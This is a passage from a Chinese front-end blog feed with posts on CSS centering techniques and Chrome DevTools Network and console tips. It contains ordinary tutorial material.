      <link href="/Blog/2019/03/20/interview/%E4%B8%80%E8%B5%B7%E6%90%9E%E6%87%82CSS%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD%E4%B8%8E%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%8416%E4%B8%AA%E6%96%B9%E6%B3%95/index/"/>
      <url>/Blog/2019/03/20/interview/%E4%B8%80%E8%B5%B7%E6%90%9E%E6%87%82CSS%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD%E4%B8%8E%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%8416%E4%B8%AA%E6%96%B9%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2019/03/20/interview/%E4%B8%80%E8%B5%B7%E6%90%9E%E6%87%82CSS%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD%E4%B8%8E%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%8416%E4%B8%AA%E6%96%B9%E6%B3%95/index/img.png"></p><h1 id="一、水平居中"><a href="#一、水平居中" class="headerlink" title="一、水平居中"></a>一、水平居中</h1><h2 id="1-1-行内元素"><a href="#1-1-行内元素" class="headerlink" title="1.1 行内元素"></a>1.1 行内元素</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h2 id="1-2-块级元素"><a href="#1-2-块级元素" class="headerlink" title="1.2 块级元素"></a>1.2 块级元素</h2><h3 id="1-2-1-块级元素一般居中方法"><a href="#1-2-1-块级元素一般居中方法" class="headerlink" title="1.2.1 块级元素一般居中方法"></a>1.2.1 块级元素一般居中方法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="1-2-2-子元素含-float"><a href="#1-2-2-子元素含-float" class="headerlink" title="1.2.2 子元素含 float"></a>1.2.2 子元素含 float</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:fit-content;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="1-2-3-Flex-弹性盒子"><a href="#1-2-3-Flex-弹性盒子" class="headerlink" title="1.2.3 Flex 弹性盒子"></a>1.2.3 Flex 弹性盒子</h3><p>1） flex 2012版</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>2）flex 2009版</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">    <span class="built_in">display</span>: <span class="built_in">box</span>;</span><br><span class="line">    <span class="built_in">box</span>-orient: horizontal;</span><br><span class="line">    <span class="built_in">box</span>-pack: <span class="built_in">center</span>;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="1-2-4-绝对定位"><a href="#1-2-4-绝对定位" class="headerlink" title="1.2.4 绝对定位"></a>1.2.4 绝对定位</h3><p>1）transform</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>2）left: 50%</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    postion: absolute;</span><br><span class="line">    <span class="attribute">width</span>: 宽度;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">0.5</span>*宽度</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>3）left&#x2F;right: 0</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: 宽度;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上是 CSS 水平居中的 8 种方法。</p><h1 id="二、垂直居中"><a href="#二、垂直居中" class="headerlink" title="二、垂直居中"></a>二、垂直居中</h1><h2 id="2-1-行内元素"><a href="#2-1-行内元素" class="headerlink" title="2.1 行内元素"></a>2.1 行内元素</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: 高度;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: 高度;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>注：① 子元素 line-height 值为父元素 height 值。② 单行文本。</strong></p><h2 id="2-2-块级元素"><a href="#2-2-块级元素" class="headerlink" title="2.2 块级元素"></a>2.2 块级元素</h2><h3 id="2-2-1-行内块级元素"><a href="#2-2-1-行内块级元素" class="headerlink" title="2.2.1 行内块级元素"></a>2.2.1 行内块级元素</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span><span class="selector-pseudo">::after</span>, <span class="selector-class">.son</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:inline-block;</span><br><span class="line">    <span class="attribute">vertical-align</span>:middle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.parent</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>适应 IE7。</p><h3 id="2-2-2-table"><a href="#2-2-2-table" class="headerlink" title="2.2.2 table"></a>2.2.2 table</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>元素高度可以动态改变, 不需再CSS中定义, 如果父元素没有足够空间时, 该元素内容也不会被截断。</li></ul><p><strong>缺点</strong></p><ul><li>IE6~7, 甚至IE8 beta中无效。</li></ul><h3 id="2-2-3-Flex-弹性盒子"><a href="#2-2-3-Flex-弹性盒子" class="headerlink" title="2.2.3 Flex 弹性盒子"></a>2.2.3 Flex 弹性盒子</h3><p>1）flex 2012版</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>内容块的宽高任意, 优雅的溢出。</li><li>可用于更复杂高级的布局技术中。</li></ul><p><strong>缺点</strong></p><ul><li>IE8&#x2F;IE9不支持。</li><li>需要浏览器厂商前缀。</li><li>渲染上可能会有一些问题。</li></ul><p>2）flex 2009版</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">    <span class="built_in">display</span>: <span class="built_in">box</span>;</span><br><span class="line">    <span class="built_in">box</span>-orien: vertical;</span><br><span class="line">    <span class="built_in">box</span>-pack: <span class="built_in">center</span>;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>实现简单, 扩展性强。</li></ul><p><strong>缺点</strong></p><ul><li>兼容性差, 不支持IE。</li></ul><h3 id="2-2-4-绝对定位"><a href="#2-2-4-绝对定位" class="headerlink" title="2.2.4 绝对定位"></a>2.2.4 绝对定位</h3><p>1）transform</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>( <span class="number">0</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>代码少。</li></ul><p><strong>缺点</strong></p><ul><li>IE8不支持, 属性需要追加浏览器厂商前缀, 可能干扰其他 transform 效果, 某些情形下会出现文本或元素边界渲染模糊的现象。</li></ul><p>2）top: 50%</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">height</span>: 高度;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">0.5</span>高度;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>适用于所有浏览器。</li></ul><p><strong>缺点</strong></p><ul><li>父元素空间不够时, 子元素可能不可见(当浏览器窗口缩小时,滚动条不出现时).如果子元素设置了overflow:auto, 则高度不够时, 会出现滚动条。</li></ul><p>3）top&#x2F;bottom: 0;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    botton: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>简单。</li></ul><p><strong>缺点</strong></p><ul><li>没有足够空间时, 子元素会被截断, 但不会有滚动条。</li></ul><h3 id="2-2-5-Grid-（新增-）"><a href="#2-2-5-Grid-（新增-）" class="headerlink" title="2.2.5 Grid （新增~）"></a>2.2.5 Grid （新增~）</h3><p>1）在网格容器上设置 <code>align-items</code> 或 <code>align-content</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:grid;</span><br><span class="line">  <span class="attribute">align-items</span>:center;</span><br><span class="line"> <span class="comment">/*align-content:center;*/</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>2）在网格项目中设置 <code>align-self</code> 或者 <code>margin: auto 0</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:grid;</span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>:center;</span><br><span class="line"> <span class="comment">/*margin: auto 0;*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>缺点</strong></p><ul><li>IE10- 浏览器不支持</li></ul><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>以上是 CSS 垂直居中的 8 种方法及其优缺点。</p><h1 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h1><p><img src="/Blog/2019/03/20/interview/%E4%B8%80%E8%B5%B7%E6%90%9E%E6%87%82CSS%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD%E4%B8%8E%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%8416%E4%B8%AA%E6%96%B9%E6%B3%95/index/img_1.png"></p><p>以上总结了水平居中、垂直居中各8个共16种方法。</p><p>其中，</p><ul><li>flex</li><li>绝对定位</li></ul><p>同时适用于水平居中和垂直居中。</p><p>希望帮助到了你。</p><p>欢迎讨论。</p><p>٩(๑❛ᴗ❛๑)۶</p><hr><p><strong>参考文献</strong></p><p>[1] louis. <a href="https://juejin.im/post/58f818bbb123db006233ab2a">16种方法实现水平居中垂直居中[OL]，2017-04-20.</a></p><p>[2] 慢思考快行动. <a href="https://link.juejin.im/?target=https://segmentfault.com/a/1190000010987658">css设置垂直居中[OL], 2017-09-03.</a></p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10丨Network 的骚操作</title>
      <link href="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/"/>
      <url>/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/</url>
      
        <content type="html"><![CDATA[<p><code>Network</code> 作为我们经常调试的 <code>Chrome</code> 面板，你知道它有哪些使用技巧吗？</p><h3 id="1-隐藏-network-overview"><a href="#1-隐藏-network-overview" class="headerlink" title="1. 隐藏 network overview"></a>1. 隐藏 network overview</h3><p>你经常查看 <code>Network</code> 面板是为了:</p><ul><li>我想看看请求的时间轴信息</li><li>我就想看看请求列表- 确认下请求状态，资源大小和响应结果呢</li></ul><p>我赌你是后者，如果是这样，那么 <code>Overview</code> 的部分就没有任何理由占用 <code>Network</code> 接近一半的空间。隐藏它！</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.png"></p><h3 id="2-Request-initiator-显示了调用堆栈信息"><a href="#2-Request-initiator-显示了调用堆栈信息" class="headerlink" title="2. Request initiator 显示了调用堆栈信息"></a>2. Request initiator 显示了调用堆栈信息</h3><blockquote><p><code>initiator</code> 可以翻译为 启动器，但是太过生硬，大家理解意思就好。</p></blockquote><p><code>Network</code> 面板中的 <code>initiator</code> 这一列显明了是哪个脚本的哪一行触发了请求。它显示了在调用堆栈中触发请求的最后一步。但如果你用的是，例如：一个本地化的 <code>fetch</code> API， 那它将会指向一些低层级的类库的代码 - 例如 当我们在 <code>Angular</code> 配合使用 <code>Axios</code> 或者 <code>zone.js</code> 的时候，这时指向的是 <code>xhr.js</code></p><p>除了这些外部库之外，如果你希望查看代码的哪一部分触发了请求。 将鼠标悬停在显示的 <code>initiator</code>（例如 外部库）上，你将看到完整的调用堆栈，包括你的文件：</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.webp"></p><h3 id="3-请求过滤"><a href="#3-请求过滤" class="headerlink" title="3. 请求过滤"></a>3. 请求过滤</h3><p><code>Network</code> 面板中的过滤器输入框接受字符串或正则表达式，对应显示匹配的请求。 但是你也可以使用它来过滤很多属性。</p><p>只需输入 例如 <code>method</code> 或者 <code>mime-type</code> :</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_1.webp"></p><p>如果想要显示所有可能的关键字，在空白的输入框按下 <code>[ctrl] + [space]</code></p><h3 id="4-自定义请求表"><a href="#4-自定义请求表" class="headerlink" title="4. 自定义请求表"></a>4. 自定义请求表</h3><p>在请求表中，你可以看到有关每个请求的几条信息，例如：<code>Status</code>， <code>Type</code>， <code>Initiator</code>， <code>Size</code>和 <code>Time</code>。但是你同样可以添加更多(例如 我经常添加 <code>Method</code>)。更多：</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_1.png"></p><blockquote><p>你可以添加所有 <code>Network</code> 面板里展示出来的信息。</p></blockquote><p>要自定义显示哪些列，右键单击请求表标题上的任意位置。</p><blockquote><p>请注意，<code>Response Headers</code> 是一个有更多选项的完整的子菜单，甚至可以定义你自己的选项。</p></blockquote><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.gif"></p><h3 id="5-重新发送-XHR-的请求"><a href="#5-重新发送-XHR-的请求" class="headerlink" title="5. 重新发送 XHR 的请求"></a>5. 重新发送 <code>XHR</code> 的请求</h3><p>如何重新发送 <code>XHR</code> 的请求？刷新页面？太老套了，试试这么做：</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_2.png"></p><h3 id="6-XHR-x2F-fetch-断点"><a href="#6-XHR-x2F-fetch-断点" class="headerlink" title="6. XHR&#x2F;fetch 断点"></a>6. XHR&#x2F;fetch 断点</h3><p>在某一特定时刻，你想要对已发送的 <code>“ajax”</code> 请求进行捕获怎么做呢？ 可以使用 <code>XHR/fetch breakpoint</code> 。</p><blockquote><p>这些只能在 <code>Source</code> 面板中设置。（我也同样希望可以直接在 <code>Network</code> 面板中设置，但事实并非如此）</p></blockquote><p>你可以添加部分 <code>URL</code> 作为触发器或监听任何请求：</p><p><img src="/Blog/2019/03/19/chrome_debug/10%E4%B8%A8Network%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09丨console中骚操作</title>
      <link href="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/"/>
      <url>/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/</url>
      
        <content type="html"><![CDATA[<p>我最开始接触前端的时候，学会用的就是 <code>console.log</code> ，甚至现在，大部分情况也还在用它调试，但是，在不同的场景下，除了 <code>log</code> ，其实有更好的选择。</p><h3 id="1-console-assert"><a href="#1-console-assert" class="headerlink" title="1. console.assert"></a>1. <code>console.assert</code></h3><p>在 <a href="https://developer.mozilla.org/en-US/docs/Web/API/console/assert">MDN</a> 中是这样定义的</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.assert(assertion, obj1 [, obj2, ..., objN]);</span><br><span class="line"><span class="built_in">console</span>.assert(assertion, msg [, subst1, ..., substN]); <span class="comment">// c-like message formatting</span></span><br></pre></td></tr></table></figure><blockquote><p>当我们传入的第一个参数为 <strong>假</strong> 时，<code>console.assert</code> 打印跟在这个参数后面的值。</p></blockquote><p>这个方法适用于什么情况呢？举个栗子：</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.gif"></p><p>通过它，你可以摆脱令人讨厌的 <code>if</code> 表达式，还可以获得堆栈信息。</p><blockquote><p>请注意，<strong>如果你使用的 <code>NodeJS</code> 版本 <code>≤ 10.0</code> ， <code>console.assert</code> 可能会中断后面代码的执行</strong>，但是在 <code>.10</code> 的版本中被修复了(当然，在浏览器中不存在这个问题)</p></blockquote><h3 id="2-增强-log-的阅读体验"><a href="#2-增强-log-的阅读体验" class="headerlink" title="2. 增强 log 的阅读体验"></a>2. 增强 <code>log</code> 的阅读体验</h3><p>有时即使你 <code>console.log</code> 一个简单的变量，你可能会忘记（或混淆）哪一个是那个。那当你有不同的变量需要打印的时候，阅读起来会更费劲。</p><p>假如有这么一堆你想要输出但看起来并不易读的数据</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.png"></p><blockquote><p><strong>“哪一个值对应哪一个变量来着？”</strong></p></blockquote><p>为了让它变得更加易读，你可以打印一个对象 - 只需将所有 <code>console.log</code> 的参数包装在大括号中。感谢 <code>ECMAScript 2015</code> 中引入了 <code>enhanced object literal(增强对象文字面量)</code> ，所以加上 <code>&#123;&#125;</code> 已经是你需要做的全部事情了：</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_1.png"></p><h3 id="3-console-table"><a href="#3-console-table" class="headerlink" title="3.console.table"></a>3.<code>console.table</code></h3><p><code>console.table</code> 这个小技巧在开发者中可能并没有多少人知道: 如果有一个 <strong>数组</strong> (或者是 <strong>类数组</strong> 的对象，或者就是一个 <strong>对象</strong> )需要打印，你可以使用 <code>console.table</code> 方法将它以一个漂亮的表格的形式打印出来。它不仅会根据数组中包含的对象的所有属性，去计算出表中的列名，而且这些列都是可以 <strong>缩放</strong>甚至 <strong>还可以排序!!!</strong></p><p>如果你觉得展示的列太多了，使用第二个参数，传入你想要展示的列的名字:</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_1.gif"></p><blockquote><p>对于后台而言，只有 <code>node</code> 版本大于 <code>10</code> 以上， <code>console.table</code> 才能起作用</p></blockquote><h3 id="4-table-和-的配合"><a href="#4-table-和-的配合" class="headerlink" title="4. table 和 {} 的配合"></a>4. table 和 <code>&#123;&#125;</code> 的配合</h3><p>我们刚刚看到了 <code>console.table</code> 这个技巧，也了解了在他上面的 <code>&#123;&#125;</code> ，那么我们为什么不将他们结合起来打造一个终极 <code>log</code> 呢？</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_2.png"></p><h3 id="5-console-dir"><a href="#5-console-dir" class="headerlink" title="5. console.dir"></a>5. <code>console.dir</code></h3><p>有时候你想要打印一个 <code>DOM</code> 节点。 <code>console.log</code> 会将这个交互式的元素渲染成像是从 <code>Elements</code> 中剪切出来的一样。如果说你想要查看 <strong>这个节点所关联到的真实的js对象</strong> 呢？并且想要查看他的 <strong>属性</strong> 等等？</p><p>在那样的情况下，就可以使用<code>console.dir</code>:</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img.webp"></p><h3 id="6-给-logs-加上时间戳"><a href="#6-给-logs-加上时间戳" class="headerlink" title="6. 给 logs 加上时间戳"></a>6. 给 <code>logs</code> 加上时间戳</h3><p>我们总是需要打印各式各样的信息，之前我们讨论了如何让输出的信息更加直观，但是如果我们需要打印相关的时间信息呢？这就用到了计时的相关操作。</p><p>如果你想要给你的应用中发生的事件加上一个确切的时间记录，开启 <em>timestamps</em> 。你可以在设置(在调试工具中的 <code>⋮</code> 下拉中找到它，或者按下 <code>F1</code> )中来开启或者使用 <a href="https://itnext.io/devtools-tips-day-6-thecommand-menu-449eb3966d9?gi=421e0c50984f#7404">Commands Menu</a>：</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_1.webp"></p><h3 id="7-监测执行时间"><a href="#7-监测执行时间" class="headerlink" title="7.监测执行时间"></a>7.监测执行时间</h3><p>与其在所有事上展示一个时间戳，或许你对脚本中的特殊的节点之间执行的时间跨度更加感兴趣，对于这样的情况，我们可以采用一对有效的 <code>console</code> 方法</p><ul><li><code>console.time()</code> — 开启一个计时器</li><li><code>console.timeEnd()</code> — 结束计时并且将结果在 <code>console</code> 中打印出来</li></ul><p>如果你想一次记录多件事，可以往这些函数中传入不同的标签值。(例如: <code>console.time(&#39;loading&#39;)</code> ， <code>console.timeEnd(&#39;loading&#39;)</code> )</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_2.webp"></p><h3 id="8-给你的-console-log-加上-CSS-样式"><a href="#8-给你的-console-log-加上-CSS-样式" class="headerlink" title="8. 给你的 console.log 加上 CSS 样式"></a>8. 给你的 <code>console.log</code> 加上 <code>CSS</code> 样式</h3><p>如果你给打印文本加上 <code>%c</code> 那么 <code>console.log</code> 的第二个参数就变成了<code>CSS</code> 规则！这个特性可以让你的日志脱颖而出(例如 <a href="https://www.facebook.com/">Facebook</a> 在你打开 <code>console</code> 的时候所做的一样)</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_3.png"></p><blockquote><p><strong>ex:</strong><code>console.log(&#39;%cStop&#39;, &#39;color:red&#39;)</code></p></blockquote><h3 id="9-让-console-log-基于调用堆栈自动缩进"><a href="#9-让-console-log-基于调用堆栈自动缩进" class="headerlink" title="9. 让 console.log 基于调用堆栈自动缩进"></a>9. 让 <code>console.log</code> 基于调用堆栈自动缩进</h3><p>配合 <code>Error</code> 对象的 <code>stack</code> 属性，让你的 <code>log</code> 可以根据堆栈的调用自动缩进：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 